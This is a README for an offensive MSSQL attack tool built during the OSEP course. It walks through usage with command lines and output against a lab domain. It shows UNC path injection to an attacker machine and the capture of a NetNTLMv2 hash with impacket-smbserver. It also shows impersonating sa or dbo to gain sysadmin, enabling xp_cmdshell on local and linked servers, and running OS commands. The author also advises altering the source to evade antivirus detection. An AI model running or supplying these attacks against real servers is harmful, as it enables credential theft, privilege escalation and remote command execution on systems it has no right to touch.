# MSSQL AttackerV1
###### By Rikunj Sindhwad
This tool is intended to carry out well-known attacks on MSSQL database servers. The tool was created during the OSEP course, and credit must be given to Offensive Security because some code snippets and ideas were lifted from the course. The tool is open source and can be used by anyone to carry out red team operations. The tool is undetected until it is developed and may be detectable by antivirus software in the future. Consider changing the source code before use.

- If you like the concept, please follow me on social media (if you can find me!).
- You can contact me via [telegram](https://t.me/R0B077) if you have any suggestions||improvements||bugs.

#### Guide

> Help Menu
```c
Z:\>MSSQLAttacker.exe
[*] MSSQL Attacker - V1 by Rikunj Sindhwad [GUI MODE] [*]
                HELP MENU
 USAGE: binary.exe GUI DatabaseServer DatabaseName [Optional] Username [Optional] Password
 USAGE: binary.exe GUI dc01.corp1.com masters SA SecretPassword
 
[*] MSSQL Attacker - V1 by Rikunj Sindhwad [CLI MODE] [*]
                HELP MENU
 USAGE: binary.exe cli -a AttackName -t DatabaseServer -d DatabaseName

 -a                     Attack Mode [Add -a to get list of attacks]
 -t                     Target Server
 -d                     Target DatabaseName
 -u                     Target Username [Optional]
 -p                     Target Password [Optional]
 -dbo                   DatabaseNmae for DBO impersonation
 -ls                    Linked MSSQLServer Name
 -l                     Attacker IP for UNC Path Injection
 -impersonateSA         ImpersonateSA before execution of any attack
 -impersonateDBO        ImpersonateDBO before execution of any attack

```

> Attack  Menu

- [ ] C-GUI 
```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value:

```
- [ ] CLI
```
Z:\>MSSQLAttacker.exe cli -a
[-] Invelid AttackName
[+] Available Attacks
        checkimpersonate
        checklinkedservers
        checklinkedserverVersion
        uncpathinject
        getinfo
        enablecmdshell
        enablelinkedcmdshell
        execlinkedcmd
        execcmd
```


#### Check Lognin user and sysadmin privilege.
The sysadmin privilege enables extra functionalities which could be used to gain access over database server through OS command execution.

- [ ] CLI

```batch
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -u sa -p lab -a getinfo
[+] Auth success!
[+] User: sa
[+] User is a member of sysadmin role

```

- [ ] C-GUI 

```
[INPUT] Enter Value: 1
[+] Logged in as: CORP1\user1
[-] User is NOT a member of sysadmin role
```

#### Check If Any user can be impersonated.
 Impersonation privilege across users will often allows to perform privileged tasks over the DB server such as enabling xp_cmdshell and many more.

- [ ] CLI

```batch
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a checkimpersonate
[+] Auth success!
[+] Impersonatable Users: sa

```

- [ ] C-GUI 

```
[INPUT] Enter Value: 3
[+] Logins that can be impersonated: sa
```


#### Check Linked MSSQL Servers.

Often linked servers are configured with sysadmin privileges. through which execution of OS command can be performed over the linked server.
- [ ] CLI
```batch
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a checklinkedservers
[+] Auth success!
[+] Linked Servers:
APPSRV01
DC01\SQLEXPRESS

```

- [ ] C-GUI 

```

[INPUT] Enter Value: 8
[+] Linked SQL server: APPSRV01
[+] Linked SQL server: DC01\SQLEXPRESS
```

#### Perform UNC Path injection attack.
The UNC Path Injection attack is well known attack performed over the MSSQL database servers. The attack send `SMB` connection to the Victim listener which can be used to perform further actions such as ntlmrelay or cracking hash to gain access over the system with database user.

- [ ] CLI
```batch
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a uncpathinject -l 192.168.49.109
[+] Auth success!
[+] Request Sent to: 192.168.XX.YYY

```

- [ ] C-GUI 

```

[INPUT] Enter Value: 2
Enter Attacker Machine IP: 192.168.00.000
[+] Request Sent to: 192.168.00.000
```

>SMBSERVER

```c
# impacket-smbserver -smb2support share . 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.00.0,61898)
[*] AUTHENTICATE_MESSAGE (CORP1\sqlsvc,DC01)
[*] User DC01\sqlsvc authenticated successfully
[*] sqlsvc::CORP1:aaaaaaaaaaaaaaaa:fd06f750293156da55e662fed63e90d3:0101000000000000002a6de9be95d8017a4bcabd0f4e7ea100000000010010004c007900560044004e00610046007300030010004c007900560044004e006100460073000200100056005000440075006100550076007100040010005600500044007500610055007600710007000800002a6de9be95d80106000400020000000800300030000000000000000000000000300000d5b59bbba756823ee684e0822332d904a879a20075e09a14f9207e27158c27aa0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340039002e003100300039000000000000000000
[*] Closing down connection (192.168.00.0,61898)
```


#### Check version of the Linked Servers.
The feature will just identifiy linked server version through banner grabbing which could be very helpful when privileges are low however, version is vulnerable to known exploits.

- [ ] CLI
```batch
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a checklinkedserverVersion -ls appsrv01
[+] Auth success!
[+] Linked Server: appsrv01
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

- [ ] C-GUI 

```
[INPUT] Enter Value: 9
Enter Linked Server: APPSRV01
[+] Linked Server Version: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

#### Enable xp_cmdshell (Local Server).
When `sysadmin` privilege is enabled, this feature will reconfigure settings to enable xp_cmdshell which is the easiest way to execute OS commands.

- [ ] CLI
```bash
#Fails as current user don't have sysadmin privileges
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablecmdshell
[+] Auth success!
[-] xp_cmdshell enable fail! || Missing Privileges

#Used -impersonateSA to enable impersonation to gain sysadmin priv.
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablecmdshell -impersonateSA
[+] Auth success!
[+] Impersonatable Users: sa
[+] Impersonation Success
[+] xp_cmdshell enabled

#Used -impersonateDBO to enable impersonation to gain sysadmin priv.

Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablecmdshell -impersonateDBO -dbo msdb
[+] Auth success!
[+] Impersonation As DBO Success
[+] xp_cmdshell enabled
```

- [ ] C-GUI 

```bash
#Through DBO impersonation
[INPUT] Enter Value: 5
Enter Database Name:msdb
[+] Impersonation As DBO Success
[INPUT] Enter Value: 6
[+] xp_cmdshell enabled
#Through SA impersonation
INPUT] Enter Value: 1
[+] Logged in as: sa
[+] User is a member of sysadmin role
[INPUT] Enter Value: 6
[+] xp_cmdshell enabled

```


#### Enable xp_cmdshell (Linked Server).

The linkedServer might have sysadmin privilege and not the connected database server. This feature enables xp_cmdshell over linkedDBServers.


- [ ] CLI
```batch
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablelinkedcmdshell -ls appsrv01
[+] Auth success!
[-] Linked Server: appsrv01      Value In Use: 0
[+] xp_cmdshell enabled
```

- [ ] C-GUI `As already Enabled through CLI`

```

[INPUT] Enter Value: 10
Enter Linked Server: APPSRV01
[+] Linked Server: APPSRV01      Value In Use: 1
[+] xp_cmdshell already enabled
```

#### Command Execution Local (When xp_cmdshell enabled).

- [ ] CLI
```bash
# Fails when no priv
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd -c whoami
[+] Auth success!
[-] xp_cmdshell enable fail! || Missing Privileges
# with impersonateSA
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd -c whoami -impersonateSA
[+] Auth success!
[+] Impersonatable Users: sa
[+] Impersonation Success
[+] xp_cmdshell enabled
corp1\sqlsvc

# with impersonateDBO
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd  -impersonateDBO -dbo msdb -c ipconfig
[+] Auth success!
[+] Impersonation As DBO Success
[+] xp_cmdshell enabled

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.XX.Y
   Subnet Mask . . . . . . . . . . . : 255.255.XXX.Y
   Default Gateway . . . . . . . . . : 192.168.XXX.YY

```

- [ ] C-GUI  when `exit` typed it will close the connection and move to main.

```

[INPUT] Enter Value: 7
[+] xp_cmdshell enabled
Enter Command: whoami
corp1\sqlsvc

Enter Command: hostname
dc01

Enter Command: exit
```

#### Blind Command Execution LinkedServer (When xp_cmdshell enabled).

Once xp_cmdshell is enabled over the linkedServer this feature enables `blind` OS command execution against the same. 

- [ ] CLI
```c
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execlinkedcmd -ls appsrv01 -c "ping 192.168.XX.YY"
[+] Auth success!
[+] Linked Server: appsrv01      Value In Use: 1
Command Executed
```
- [ ] C-GUI
```c
[INPUT] Enter Value: 11
Enter Linked Server: APPSRV01
[+] Linked xp_cmdshell value_in_use: 1
Enter Command: ping 192.168.xx.yy
[+] Command Executed
```
